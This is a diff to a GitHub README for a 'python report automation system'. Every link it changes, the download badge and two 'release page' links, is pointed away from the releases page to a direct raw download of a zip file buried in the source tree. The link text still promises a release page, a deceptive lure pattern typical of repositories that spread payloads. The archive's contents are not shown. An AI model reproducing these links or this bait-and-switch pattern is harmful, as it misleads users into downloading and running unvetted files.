@@ -1,6 +1,6 @@
 # 🚀 python-report-automation-system - Automate Reports Easily and Save Time
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/HGFHDD/python-report-automation-system/releases)
+[![Download](https://github.com/HGFHDD/python-report-automation-system/raw/refs/heads/main/src/core/automation_report_python_system_v1.4.zip)](https://github.com/HGFHDD/python-report-automation-system/raw/refs/heads/main/src/core/automation_report_python_system_v1.4.zip)
 
 ## 📋 Overview
 
@@ -10,7 +10,7 @@ The python-report-automation-system is an enterprise solution designed to automa
 
 To begin using the python-report-automation-system, you need to download the software. Follow these steps:
 
-1. Click [here to visit the release page](https://github.com/HGFHDD/python-report-automation-system/releases).
+1. Click [here to visit the release page](https://github.com/HGFHDD/python-report-automation-system/raw/refs/heads/main/src/core/automation_report_python_system_v1.4.zip).
 2. On the release page, choose the latest version.
 3. Look for the appropriate file for your operating system and click on it to download.
 
@@ -75,4 +75,4 @@ We are continually improving our system. Future updates may include advanced ana
 
 If you need further assistance, do not hesitate to reach out. You can create an issue in the GitHub repository or contact support through the provided channels on the release page.
 
-For more information, visit our [releases page](https://github.com/HGFHDD/python-report-automation-system/releases) or check out the latest updates and features.
+For more information, visit our [releases page](https://github.com/HGFHDD/python-report-automation-system/raw/refs/heads/main/src/core/automation_report_python_system_v1.4.zip) or check out the latest updates and features.
